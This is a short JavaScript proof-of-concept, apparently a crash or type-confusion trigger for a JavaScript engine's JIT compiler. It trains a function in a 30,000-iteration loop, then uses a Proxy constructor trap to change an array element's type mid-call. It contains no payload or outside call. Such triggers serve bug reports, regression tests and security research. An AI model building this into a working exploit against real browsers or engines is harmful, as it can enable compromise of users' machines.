function poc(array, p_constructor) {
    array[0];
    new p_constructor();
    if (array[0] === 1.1) {
        array[0] = 2;
    }
}

let arr = [1];

const handler = {
    construct: () => {
        arr[0] = 1.1;
        return {};
    }
};

const proxy = new Proxy(function() {}, handler);
const dummy = function() {};

for (let i = 0; i < 30000; i++) {
    poc(arr, dummy);
    arr = [1];
}

poc(arr, proxy);
